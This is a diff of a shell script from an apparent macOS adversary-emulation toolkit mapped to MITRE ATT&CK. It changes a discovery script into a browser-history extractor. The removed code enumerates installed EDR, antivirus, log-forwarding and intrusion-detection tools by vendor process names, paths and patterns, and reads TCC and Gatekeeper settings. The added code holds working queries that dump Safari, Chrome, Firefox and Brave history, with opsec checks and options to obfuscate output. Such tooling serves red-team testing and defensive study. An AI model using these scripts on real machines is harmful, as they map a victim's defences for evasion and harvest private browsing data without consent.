@@ -1,14 +1,15 @@
+#!/bin/sh
 # POSIX-compliant shell script - avoid bashisms
-# Script Name: 1518_security_software.sh
-# MITRE ATT&CK Technique: 1518
+# Script Name: 1217_browser_history.sh
+# MITRE ATT&CK Technique: 1217
 # Author: @darmado | https://x.com/darmad0
-# Date: 2025-01-27
-# Version: 1.0.0
+# Date: 2025-05-27
+# Version: 2.0.0
 
 # Description:
-# Discover EDR (Endpoint Detection and Response) solutions installed on macOS.
+# Extract browser history from Safari, Chrome, Firefox, and Brave on macOS.
 # MITRE ATT&CK Tactic: Discovery
-# Procedure GUID: 123e4567-e89b-12d3-a456-426614174001
+# Procedure GUID: 123e4567-e89b-12d3-a456-426614174000
 # Generated from YAML procedure definition using build_procedure.py
 # The script uses native macOS commands and APIs for maximum compatibility.
 
@@ -37,7 +38,7 @@ TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
 JOB_ID=""  # Will be set after core functions are defined
 
 # Script Information
-NAME="1518_security_software"
+NAME="1217_browser_history"
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
@@ -108,90 +109,105 @@ STEG_EXTRACT=false # Extract hidden data from steganography
 STEG_EXTRACT_FILE="" # File to extract hidden data from
 
 # OPSEC Check Settings (enabled by build script based on YAML configuration)
-CHECK_PERMS="false"
-CHECK_FDA="false"
-CHECK_DB_LOCK="false"
+CHECK_PERMS="true"
+CHECK_FDA="true"
+CHECK_DB_LOCK="true"
 
-EDR_PS=false
-EDR_FILES=false
-EDR_DIR=false
-EDR_INFO=false
-EDR_ALL=false
+SAFARI=false
+CHROME=false
+FIREFOX=false
+BRAVE=false
+INPUT_SEARCH=""
+INPUT_LAST=""
+INPUT_STARTTIME=""
+INPUT_ENDTIME=""
 
-# Additional security app discovery flags
-OST_APPS=false
-MRT_APPS=false
-LOGFORWARD_APPS=false
-VPN_APPS=false
-HIDS_APPS=false
-TCC_CHECK=false
-GATEKEEPER_CHECK=false
+INPUT_LAST=7
+INPUT_SEARCH=""
+DB_HISTORY_SAFARI="$HOME/Library/Safari/History.db"
+DB_HISTORY_CHROME="$HOME/Library/Application Support/Google/Chrome/Default/History"
+CMD_QUERY_BROWSER_DB="$CMD_SQLITE3 -separator '|'"
+DB_HISTORY_BRAVE="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
+DB_HISTORY_FIREFOX="$HOME/Library/Application Support/Firefox/Profiles/*.default-release/places.sqlite"
+SAFARI_HDB_QUERY="
+    WITH headers AS (
+        SELECT 'source' as source, 'domain' as domain, 'title' as title, 
+            'visit_date' as visit_date, 'url' as url, 'visit_count' as visit_count
+    )
+    SELECT * FROM headers
+    UNION ALL
+    SELECT 
+        'Safari' as source,
+        hi.domain_expansion as domain,
+        hv.title,
+        datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as visit_date,
+        hi.url,
+        hi.visit_count
+    FROM history_items hi
+    JOIN history_visits hv ON hi.id = hv.history_item
+    WHERE hv.visit_time > (strftime('%s', 'now') - 978307200 - (\$INPUT_LAST * 86400))
+    \$INPUT_SEARCH
+    ORDER BY visit_date DESC
+"
 
-EDR_VENDOR_PROC=(
-    "CrowdStrike:falconctl,falcon-sensor"
-    "CarbonBlack:cbdaemon,cbagent"
-    "SentinelOne:SentinelAgent,SentinelService"
-    "Cylance:CylanceSvc,CylanceUI"
-    "FireEye:FireEyeAgent,FireEyeService"
-    "CiscoAMP:ampdaemon,ampservice"
-    "PaloAlto:CortexService,TrapsService"
-    "MicrosoftDefender:mds,mdatp"
-    "TrendMicroApexOne:ds_agent,tmlisten"
-    "SophosInterceptX:sophosd,sophosservice"
-    "McAfee:mcafeeagent,mcafeed"
-)
-EDR_VENDOR_APP=(
-    "CrowdStrike.app"
-    "CarbonBlack.app"
-    "SentinelOne.app"
-    "Cylance.app"
-    "FireEye.app"
-    "CiscoAMP.app"
-    "Cortex XDR.app"
-    "Microsoft Defender.app"
-    "TrendMicroSecurity.app"
-    "Sophos_Endpoint.app"
-    "McAfee_Endpoint Security for Mac.app"
-    "Kaspersky.app"
-    "Bitdefender.app"
-    "ESET.app"
-    "Avast.app"
-    "AVG.app"
-    "Norton.app"
-    "Symantec.app"
-    "Malwarebytes.app"
-    "Webroot.app"
-    "F-Secure.app"
-)
-EDR_PATHS=(
-    "/Applications/SentinelOne.app"
-    "/Applications/CarbonBlack/CbOsxSensorService"
-    "/Applications/Red Canary Mac Monitor.app"
-    "/Library/CS/falconctl"
-    "/Library/Sophos Anti-Virus"
-    "/Library/Application Support/Cylance/Desktop/CylanceUI.app"
-    "/Library/Application Support/TrendMicro"
-    "/Library/CS"
-    "/Library/CrowdStrike"
-    "/Library/Sentinel"
-    "/Library/Carbon"
-    "/Library/Extensions/CbOsxSensorExtension.kext"
-    "/Library/Extensions/SentinelExtension.kext"
-    "/Library/Extensions/CylanceDRIVERosx.kext"
-    "/Library/Application Support/Cylance"
-    "/Library/Application Support/CrowdStrike"
-    "/Library/Application Support/Sophos"
-    "/Library/Application Support/Carbon Black"
-    "/Library/LaunchDaemons/com.crowdstrike.*"
-    "/Library/LaunchDaemons/com.sentinelone.*"
-    "/Library/LaunchDaemons/com.carbonblack.*"
-    "/Library/LaunchDaemons/com.vmware.carbonblack.*"
-    "/Library/LaunchDaemons/com.cylance.*"
-    "/Library/LaunchDaemons/com.microsoft.defender.*"
-    "/Library/LaunchDaemons/com.sophos.*"
-    "/Library/LaunchAgents/com.sophos.*"
-    "/Library/PrivilegedHelperTools/com.sophos.*"
-)
+CHROME_HDB_QUERY="
+    WITH headers AS (
+        SELECT 'source' as source, 'url' as url, 'title' as title, 
+            'visit_date' as visit_date, 'visit_count' as visit_count
+    )
+    SELECT * FROM headers
+    UNION ALL
+    SELECT 
+        'Chrome' as source,
+        url,
+        title,
+        datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit,
+        visit_count
+    FROM urls
+    WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000)
+    \$INPUT_SEARCH
+    ORDER BY last_visit DESC
+"
+
+FIREFOX_HDB_QUERY="
+    WITH headers AS (
+        SELECT 'source' as source, 'url' as url, 'title' as title, 
+            'visit_date' as visit_date, 'visit_count' as visit_count
+    )
+    SELECT * FROM headers
+    UNION ALL
+    SELECT 
+        'Firefox' as source,
+        url,
+        title,
+        datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit,
+        visit_count
+    FROM moz_places
+    WHERE last_visit_date > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000)
+    \$INPUT_SEARCH
+    ORDER BY last_visit DESC
+"
+
+BRAVE_HDB_QUERY="
+    WITH headers AS (
+        SELECT 'source' as source, 'url' as url, 'title' as title, 
+            'visit_date' as visit_date, 'visit_count' as visit_count
+    )
+    SELECT * FROM headers
+    UNION ALL
+    SELECT 
+        'Brave' as source,
+        url,
+        title,
+        datetime(last_visit_time/1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as last_visit,
+        visit_count
+    FROM urls
+    WHERE last_visit_time > ((strftime('%s', 'now') - \$INPUT_LAST * 86400) * 1000000)
+    \$INPUT_SEARCH
+    ORDER BY last_visit DESC
+    LIMIT 1000
+"
+
 
 # MITRE ATT&CK Mappings
 TACTIC="Discovery" #replace with your corresponding tactic
@@ -230,18 +246,6 @@ TCC_USER_DB="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
 
 # Default Steganography Carrier Image
 DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"
-
-# EDR/AV vendor pattern for detection
-EDR_PATTERN="crowdstrike|carbonblack|sentinel|cylance|fireeye|cisco|cortex|defender|trend|sophos|mcafee|kaspersky|bitdefender|eset|avast|avg|norton|symantec|malwarebytes|webroot|f-secure"
-
-# Additional security app patterns
-OST_PATTERN="lulu|knockknock|reikey|oversight|blockblock|kextviewr|whatsyoursign|taskexplorer|netiquette|ransomwhere"
-MRT_PATTERN="malwarebytes|adwaremedic|combo.cleaner|cleanmymac|ccleaner|bitdefender.removal"
-LOGFORWARD_PATTERN="splunk|fluentd|filebeat|logstash|nxlog|rsyslog|syslog-ng"
-VPN_PATTERN="expressvpn|nordvpn|cisco.anyconnect|tunnelblick|viscosity|openvpn|wireguard|mullvad"
-HIDS_PATTERN="ossec|wazuh|samhain|aide|tripwire|osquery"
-
-# Expand EDR/AV vendor list
 
 #------------------------------------------------------------------------------
 # CORE FUNCTIONS FROM base.sh
@@ -657,42 +661,62 @@ core_parse_args() {
                 fi
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        -p|--edr-ps)
-            EDR_PS=true
+        -s|--safari)
+            SAFARI=true
             ;;
-        -f|--edr-files)
-            EDR_FILES=true
+        -c|--chrome)
+            CHROME=true
             ;;
-        -d|--edr-dir)
-            EDR_DIR=true
+        -f|--firefox)
+            FIREFOX=true
             ;;
-        -i|--edr-info)
-            EDR_INFO=true
+        -b|--brave)
+            BRAVE=true
             ;;
-        -a|--edr-all)
-            EDR_ALL=true
-            ;;
-        --ost)
-            OST_APPS=true
-            ;;
-        --mrt)
-            MRT_APPS=true
-            ;;
-        --log-forwarder)
-            LOGFORWARD_APPS=true
-            ;;
-        --vpn)
-            VPN_APPS=true
-            ;;
-        --hids)
-            HIDS_APPS=true
-            ;;
-        --tcc)
-            TCC_CHECK=true
-            ;;
-        --gatekeeper)
-            GATEKEEPER_CHECK=true
-            ;;
+        --search)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                # Next arg starts with -, so no value provided
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                    INPUT_SEARCH="$2"
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --last)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                # Next arg starts with -, so no value provided
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                    INPUT_LAST="$2"
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --starttime)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                # Next arg starts with -, so no value provided
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                    INPUT_STARTTIME="$2"
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --endtime)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                # Next arg starts with -, so no value provided
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                    INPUT_ENDTIME="$2"
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
             *)
                 # Collect unknown arguments for error reporting
                 if [ -z "$UNKNOWN_ARGS" ]; then
@@ -731,18 +755,14 @@ Basic Options:
   -d, --debug          Enable debug output (includes verbose output)
   -a, --all            Process all available data (technique-specific)
   --ls                 List files in the current directory using ls command
-  -p|--edr-ps               Check for EDR processes using ps
-  -f|--edr-files            Check for EDR files and applications
-  -d|--edr-dir              Check for EDR directories
-  -i|--edr-info             Get detailed EDR application information
-  -a|--edr-all              Run all EDR detection methods
-  --ost                    Discover Objective-See security tools
-  --mrt                    Discover malware removal tools
-  --log-forwarder          Discover log forwarding applications
-  --vpn                    Discover VPN applications
-  --hids                   Discover Host-based Intrusion Detection Systems
-  --tcc                    Check for TCC.db access
-  --gatekeeper             Check for Gatekeeper settings
+  -s|--safari               Extract Safari history
+  -c|--chrome               Extract Chrome history
+  -f|--firefox              Extract Firefox history
+  -b|--brave                Extract Brave history
+  --search VALUE            Search for specific terms in history
+  --last VALUE              Last N days to search
+  --starttime VALUE         Start time in YY-MM-DD HH:MM:SS format
+  --endtime VALUE           End time in YY-MM-DD HH:MM:SS format
 
 Output Options:
   --format TYPE        Output format: 
@@ -1967,86 +1987,36 @@ core_main() {
 # Execute main logic
 raw_output=""
 
-# Execute functions for -p|--edr-ps
-if [ "$EDR_PS" = true ]; then
-    core_debug_print "Executing EDR process discovery"
-    result=$(discover_edr_processes)
+# Execute functions for -s|--safari
+if [ "$SAFARI" = true ]; then
+    core_debug_print "Executing functions for -s|--safari"
+    result=$(query_safari_history)
     raw_output="${raw_output}${result}\n"
 fi
 
-# Execute functions for -i|--edr-info (applications)
-if [ "$EDR_INFO" = true ]; then
-    core_debug_print "Executing EDR application discovery"
-    result=$(discover_edr_info)
+# Execute functions for -c|--chrome
+if [ "$CHROME" = true ]; then
+    core_debug_print "Executing functions for -c|--chrome"
+    result=$(query_chrome_history)
     raw_output="${raw_output}${result}\n"
 fi
 
-# Execute functions for -a|--edr-all
-if [ "$EDR_ALL" = true ]; then
-    core_debug_print "Executing all EDR detection methods"
-    result=$(discover_edr_processes)
-    raw_output="${raw_output}${result}\n"
-    result=$(discover_edr_info)
+# Execute functions for -f|--firefox
+if [ "$FIREFOX" = true ]; then
+    core_debug_print "Executing functions for -f|--firefox"
+    result=$(query_firefox_history)
     raw_output="${raw_output}${result}\n"
 fi
 
-# For legacy flags that we removed (files/directories), just use EDR info
-if [ "$EDR_FILES" = true ] || [ "$EDR_DIR" = true ]; then
-    core_debug_print "Executing EDR application discovery (legacy flags)"
-    result=$(discover_edr_info)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --ost
-if [ "$OST_APPS" = true ]; then
-    core_debug_print "Executing Objective-See tools discovery"
-    result=$(discover_ost_apps)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --mrt
-if [ "$MRT_APPS" = true ]; then
-    core_debug_print "Executing malware removal tools discovery"
-    result=$(discover_mrt_apps)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --log-forwarder
-if [ "$LOGFORWARD_APPS" = true ]; then
-    core_debug_print "Executing log forwarding applications discovery"
-    result=$(discover_logforward_apps)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --vpn
-if [ "$VPN_APPS" = true ]; then
-    core_debug_print "Executing VPN applications discovery"
-    result=$(discover_vpn_apps)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --hids
-if [ "$HIDS_APPS" = true ]; then
-    core_debug_print "Executing HIDS applications discovery"
-    result=$(discover_hids_apps)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# TODO: Execute functions for --tcc and --gatekeeper (different logic needed)
-if [ "$TCC_CHECK" = true ]; then
-    core_debug_print "Executing TCC database discovery"
-    result=$(discover_tcc_info)
-    raw_output="${raw_output}${result}\n"
-fi
-
-if [ "$GATEKEEPER_CHECK" = true ]; then
-    core_debug_print "Executing Gatekeeper configuration discovery"
-    result=$(discover_gatekeeper_info)
+# Execute functions for -b|--brave
+if [ "$BRAVE" = true ]; then
+    core_debug_print "Executing functions for -b|--brave"
+    result=$(query_brave_history)
     raw_output="${raw_output}${result}\n"
 fi
 
 # Set data source
-data_source="1518_security_software"
+data_source="1217_browser_history"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2212,350 +2182,137 @@ core_generate_encryption_key() {
 
 # Functions from YAML procedure
 
-# Generic function for discovering security applications and launch items
-# Inputs: $1 - category name, $2 - search pattern
-discover_security_apps() {
-    local category="$1"
-    local pattern="$2"
+# Function: query_safari_history
+# Description: query_safari_history - Generated from YAML procedure
+query_safari_history() {
+    # Build search clause locally like the working script
+    local search_clause=""
+    if [ -n "$INPUT_SEARCH" ]; then
+        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
+        search_clause="AND (hi.url LIKE '%${input_search_escaped}%' OR hi.domain_expansion LIKE '%${input_search_escaped}%' OR hv.title LIKE '%${input_search_escaped}%')"
+    fi
+
+    # Use the exact pattern from the working script
+    local query="${SAFARI_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
+    local query_final="${query//\$INPUT_SEARCH/$search_clause}"
+
+    local result=$(query_browser_db "$DB_HISTORY_SAFARI" "$query_final")
+    core_debug_print "Query result length: ${#result} characters"
+    $CMD_PRINTF "%s\n" "$result"
+    return 0
+}
+
+
+# Function: query_chrome_history
+# Description: query_chrome_history - Generated from YAML procedure
+query_chrome_history() {
+    local search_clause=""
+    if [ -n "$INPUT_SEARCH" ]; then
+        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
+        search_clause="AND (url LIKE '%${input_search_escaped}%' OR title LIKE '%${input_search_escaped}%')"
+    fi
+
+    local query="${CHROME_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
+    local query_final="${query//\$INPUT_SEARCH/$search_clause}"
     
-    # Get applications from system profiler
-    system_profiler SPApplicationsDataType | perl -00 -ne "print if /$pattern/i"
+    core_debug_print "Executing Chrome history query"
     
-    # Parse launch daemon intelligence
-    echo ""
-    echo "launch-daemons:"
-    echo "  level: system"
-    local found_daemons=false
-    find /Library/LaunchDaemons -name "*.plist" -exec grep -l -i -E "$pattern" {} \; 2>/dev/null | while read plist; do
-        found_daemons=true
-        label=$(plutil -extract Label raw "$plist" 2>/dev/null || echo "Unknown")
-        program=$(plutil -extract ProgramArguments.0 raw "$plist" 2>/dev/null || plutil -extract Program raw "$plist" 2>/dev/null || echo "Unknown")
-        keepalive=$(plutil -extract KeepAlive raw "$plist" 2>/dev/null | head -1 || echo "false")
-        runatload=$(plutil -extract RunAtLoad raw "$plist" 2>/dev/null | head -1 || echo "false")
-        
-        # Determine persistence
-        if [ "$runatload" = "true" ] && [ "$keepalive" = "true" ]; then
-            persistence="true"
+    local result=$(query_browser_db "$DB_HISTORY_CHROME" "$query_final")
+    $CMD_PRINTF "%s\n" "$result"
+    return 0
+}
+
+
+# Function: query_firefox_history
+# Description: query_firefox_history - Generated from YAML procedure
+query_firefox_history() {
+    local firefox_db=$(resolve_firefox_db)
+
+    local search_clause=""
+    if [ -n "$INPUT_SEARCH" ]; then
+        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
+        search_clause="AND (url LIKE '%${input_search_escaped}%' OR title LIKE '%${input_search_escaped}%')"
+    fi
+
+    local query="${FIREFOX_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
+    local query_final="${query//\$INPUT_SEARCH/$search_clause}"
+    
+    core_debug_print "Executing Firefox history query"
+    
+    local result=$(query_browser_db "$firefox_db" "$query_final")
+    $CMD_PRINTF "%s\n" "$result"
+    return 0
+}
+
+
+# Function: query_brave_history
+# Description: query_brave_history - Generated from YAML procedure
+query_brave_history() {
+    local search_clause=""
+    if [ -n "$INPUT_SEARCH" ]; then
+        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
+        search_clause="AND (url LIKE '%${input_search_escaped}%' OR title LIKE '%${input_search_escaped}%')"
+    fi
+
+    # Use the exact pattern from the working script
+    local query="${BRAVE_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
+    local query_final="${query//\$INPUT_SEARCH/$search_clause}"
+    
+    core_debug_print "Executing Brave history query"
+    
+    local result=$(query_browser_db "$DB_HISTORY_BRAVE" "$query_final")
+    $CMD_PRINTF "%s\n" "$result"
+    return 0
+}
+
+
+# Function: resolve_firefox_db
+# Description: resolve_firefox_db - Generated from YAML procedure
+resolve_firefox_db() {
+    $CMD_LS "$HOME/Library/Application Support/Firefox/Profiles/"*.default-release/places.sqlite 2>/dev/null | $CMD_HEAD -n 1
+    return $?
+}
+
+
+# Function: query_browser_db
+# Description: query_browser_db - Generated from YAML procedure
+query_browser_db() {
+    local db="$1"
+    local query="$2"
+    local db_name=$(basename "$db")
+    
+    core_debug_print "=== Database Query Debug ==="
+    core_debug_print "Database: '$db'"
+    core_debug_print "Command: '$CMD_QUERY_BROWSER_DB'"
+    core_debug_print "Full command: $CMD_QUERY_BROWSER_DB '$db' '$query'"
+    core_debug_print "Executing query..."
+    
+    # Execute query and capture both stdout and stderr
+    local result
+    local error_output
+    error_output=$($CMD_QUERY_BROWSER_DB "$db" "$query" 2>&1)
+    local exit_code=$?
+    
+    if [ $exit_code -ne 0 ]; then
+        # Check if it's a database lock error
+        if $CMD_PRINTF "%s\n" "$error_output" | $CMD_GREP -q "database is locked"; then
+            core_handle_error "Database '$db_name' is locked - close the browser first or wait for it to finish"
+        elif $CMD_PRINTF "%s\n" "$error_output" | $CMD_GREP -q "no such file"; then
+            core_handle_error "Database file not found: '$db'"
+        elif $CMD_PRINTF "%s\n" "$error_output" | $CMD_GREP -q "permission denied"; then
+            core_handle_error "Permission denied accessing database: '$db_name'"
         else
-            persistence="false"
+            core_handle_error "Database query failed for '$db_name': $error_output"
         fi
-        
-        echo "  service: $label"
-        echo "    program: $program"
-        echo "    persistence: $persistence"
-        echo "    privilege-level: root"
-        echo "    auto-start: $runatload"
-        echo "    keep-alive: $keepalive"
-        echo "    file: $plist"
-        echo ""
-    done
-    
-    # Check if any daemons were found
-    if ! find /Library/LaunchDaemons -name "*.plist" -exec grep -l -i -E "$pattern" {} \; 2>/dev/null | head -1 > /dev/null; then
-        echo "  none"
-        echo ""
+        return $exit_code
     fi
     
-    # Parse launch agent intelligence  
-    echo "launch-agents:"
-    echo "  level: user"
-    local found_agents=false
-    find /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" -exec grep -l -i -E "$pattern" {} \; 2>/dev/null | while read plist; do
-        found_agents=true
-        label=$(plutil -extract Label raw "$plist" 2>/dev/null || echo "Unknown")
-        program=$(plutil -extract ProgramArguments.0 raw "$plist" 2>/dev/null || plutil -extract Program raw "$plist" 2>/dev/null || echo "Unknown")
-        keepalive=$(plutil -extract KeepAlive raw "$plist" 2>/dev/null | head -1 || echo "false")
-        runatload=$(plutil -extract RunAtLoad raw "$plist" 2>/dev/null | head -1 || echo "false")
-        
-        # Determine persistence
-        if [ "$runatload" = "true" ] && [ "$keepalive" = "true" ]; then
-            persistence="true"
-        else
-            persistence="false"
-        fi
-        
-        echo "  service: $label"
-        echo "    program: $program"
-        echo "    persistence: $persistence"
-        echo "    privilege-level: user"
-        echo "    auto-start: $runatload"
-        echo "    keep-alive: $keepalive"
-        echo "    file: $plist"
-        echo ""
-    done
-    
-    # Check if any agents were found
-    if ! find /Library/LaunchAgents ~/Library/LaunchAgents -name "*.plist" -exec grep -l -i -E "$pattern" {} \; 2>/dev/null | head -1 > /dev/null; then
-        echo "  none"
-    fi
+    # Output the result if successful
+    $CMD_PRINTF "%s\n" "$error_output"
+    return 0
 }
 
-# Function: discover_edr_processes
-# Description: Check for running EDR processes by vendor
-discover_edr_processes() {
-    # Use ps with -Av: shows PID, state, memory (VSZ, RSS), CPU usage (%CPU, %MEM), and full command
-    # Critical intel for attackers (PIDs to target) and defenders (resource usage, legitimacy)
-    $CMD_PS -Av | $CMD_GREP -E "$EDR_PATTERN" -i | $CMD_GREP -v $CMD_GREP
-}
 
-# Function: discover_edr_info
-# Description: Get detailed information about EDR applications and launch items
-discover_edr_info() {
-    discover_security_apps "edr" "$EDR_PATTERN"
-}
-
-# Function: discover_ost_apps
-# Description: Discover Objective-See security tools
-discover_ost_apps() {
-    discover_security_apps "ost" "$OST_PATTERN"
-}
-
-# Function: discover_mrt_apps  
-# Description: Discover malware removal tools
-discover_mrt_apps() {
-    discover_security_apps "mrt" "$MRT_PATTERN"
-}
-
-# Function: discover_logforward_apps
-# Description: Discover log forwarding applications
-discover_logforward_apps() {
-    discover_security_apps "logforward" "$LOGFORWARD_PATTERN"
-}
-
-# Function: discover_vpn_apps
-# Description: Discover VPN applications
-discover_vpn_apps() {
-    discover_security_apps "vpn" "$VPN_PATTERN"
-}
-
-# Function: discover_hids_apps
-# Description: Discover Host-based Intrusion Detection Systems
-discover_hids_apps() {
-    discover_security_apps "hids" "$HIDS_PATTERN"
-}
-
-# Function: discover_tcc_info
-# Description: Check TCC (Transparency, Consent, and Control) database and configuration
-discover_tcc_info() {
-    echo "tcc-database:"
-    echo "  level: system"
-    
-    # Check if TCC service is running
-    if pgrep syspolicyd > /dev/null; then
-        echo "  service: syspolicyd"
-        echo "    status: active"
-        echo "    privilege-level: root"
-        
-        # Check system TCC database
-        if [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ]; then
-            echo "    system-database: $TCC_SYSTEM_DB"
-            echo "    database-readable: true"
-            
-            # Extract key TCC permissions
-            echo "    permissions:"
-            $CMD_SQLITE3 "$TCC_SYSTEM_DB" "SELECT client, service, allowed, prompt_count FROM access LIMIT 10" 2>/dev/null | while IFS='|' read -r client service allowed prompt_count; do
-                echo "      client: $client"
-                echo "        service: $service" 
-                echo "        allowed: $allowed"
-                echo "        prompt-count: $prompt_count"
-            done
-        else
-            echo "    system-database: $TCC_SYSTEM_DB"
-            echo "    database-readable: false"
-        fi
-        
-        # Check user TCC database
-        if [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]; then
-            echo "    user-database: $TCC_USER_DB"
-            echo "    user-database-readable: true"
-        else
-            echo "    user-database: $TCC_USER_DB"
-            echo "    user-database-readable: false"
-        fi
-    else
-        echo "  service: syspolicyd"
-        echo "    status: inactive"
-    fi
-}
-
-# Function: discover_gatekeeper_info  
-# Description: Check Gatekeeper status and configuration
-discover_gatekeeper_info() {
-    echo "gatekeeper:"
-    echo "  level: system"
-    
-    # Check Gatekeeper status
-    local gatekeeper_status=$($CMD_SPCTL --status 2>/dev/null)
-    if echo "$gatekeeper_status" | $CMD_GREP -q "enabled"; then
-        echo "  service: spctl"
-        echo "    status: enabled"
-        echo "    privilege-level: root"
-        
-        # Get detailed assessment for a known app
-        echo "    configuration:"
-        local assessment=$($CMD_SPCTL --assess --verbose /Applications/Safari.app 2>/dev/null)
-        if [ -n "$assessment" ]; then
-            echo "      assessment-sample: /Applications/Safari.app"
-            echo "      assessment-result: |"
-            echo "$assessment" | while IFS= read -r line; do
-                echo "        $line"
-            done
-        fi
-        
-        # Check signing requirement policies
-        echo "      policies:"
-        $CMD_SPCTL --list 2>/dev/null | $CMD_HEAD -5 | while IFS= read -r line; do
-            echo "        policy: $line"
-        done
-    else
-        echo "  service: spctl"
-        echo "    status: disabled"
-        echo "    privilege-level: root"
-    fi
-}
-
-# Function: discover_xprotect_info
-# Description: Check XProtect malware detection service
-discover_xprotect_info() {
-    echo "xprotect:"
-    echo "  level: system"
-    
-    local xprotect_file="/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist"
-    
-    if pgrep XProtectService > /dev/null; then
-        echo "  service: XProtectService"
-        echo "    status: active"
-        echo "    privilege-level: root"
-        
-        if [ -f "$xprotect_file" ] && [ -r "$xprotect_file" ]; then
-            echo "    configuration-file: $xprotect_file"
-            echo "    configuration-readable: true"
-            
-            # Extract version and update info
-            local version=$($CMD_DEFAULTS read "$xprotect_file" Version 2>/dev/null || echo "Unknown")
-            local last_update=$($CMD_DEFAULTS read "$xprotect_file" LastModification 2>/dev/null || echo "Unknown")
-            
-            echo "    version: $version"
-            echo "    last-update: $last_update"
-        else
-            echo "    configuration-file: $xprotect_file"
-            echo "    configuration-readable: false"
-        fi
-    else
-        echo "  service: XProtectService"
-        echo "    status: inactive"
-    fi
-}
-
-# Function: discover_mrt_info
-# Description: Check Malware Removal Tool (MRT) service
-discover_mrt_info() {
-    echo "malware-removal-tool:"
-    echo "  level: system"
-    
-    local mrt_file="/System/Library/CoreServices/MRT.app/Contents/Info.plist"
-    
-    if pgrep MRT > /dev/null; then
-        echo "  service: MRT"
-        echo "    status: active" 
-        echo "    privilege-level: root"
-        
-        if [ -f "$mrt_file" ] && [ -r "$mrt_file" ]; then
-            echo "    application-bundle: /System/Library/CoreServices/MRT.app"
-            echo "    configuration-readable: true"
-            
-            # Extract version info
-            local version=$($CMD_DEFAULTS read "$mrt_file" CFBundleVersion 2>/dev/null || echo "Unknown")
-            local build=$($CMD_DEFAULTS read "$mrt_file" CFBundleShortVersionString 2>/dev/null || echo "Unknown")
-            
-            echo "    version: $version"
-            echo "    build: $build"
-        else
-            echo "    application-bundle: /System/Library/CoreServices/MRT.app"
-            echo "    configuration-readable: false"
-        fi
-    else
-        echo "  service: MRT"
-        echo "    status: inactive"
-    fi
-}
-
-# Function: discover_firewall_info
-# Description: Check macOS Application Firewall configuration
-discover_firewall_info() {
-    echo "application-firewall:"
-    echo "  level: system"
-    
-    local firewall_file="/Library/Preferences/com.apple.alf.plist"
-    local global_state=$($CMD_DEFAULTS read /Library/Preferences/com.apple.alf globalstate 2>/dev/null || echo "0")
-    
-    if [ "$global_state" = "1" ]; then
-        echo "  service: socketfilterfw"
-        echo "    status: enabled"
-        echo "    privilege-level: root"
-        echo "    configuration-file: $firewall_file"
-        
-        if [ -f "$firewall_file" ] && [ -r "$firewall_file" ]; then
-            echo "    configuration-readable: true"
-            
-            # Get global state details
-            echo "    configuration:"
-            local stealth_mode=$($CMD_DEFAULTS read /Library/Preferences/com.apple.alf stealthenabled 2>/dev/null || echo "0")
-            local logging_mode=$($CMD_DEFAULTS read /Library/Preferences/com.apple.alf loggingenabled 2>/dev/null || echo "0")
-            
-            echo "      global-state: $global_state"
-            echo "      stealth-mode: $stealth_mode"
-            echo "      logging-enabled: $logging_mode"
-            
-            # List first few applications with firewall rules
-            echo "      applications:"
-            sudo /usr/libexec/ApplicationFirewall/socketfilterfw --listapps 2>/dev/null | $CMD_HEAD -10 | while IFS= read -r line; do
-                echo "        rule: $line"
-            done
-        else
-            echo "    configuration-readable: false"
-        fi
-    else
-        echo "  service: socketfilterfw"
-        echo "    status: disabled"
-        echo "    privilege-level: root"
-    fi
-}
-
-# Function: discover_quarantine_info
-# Description: Check File Quarantine system
-discover_quarantine_info() {
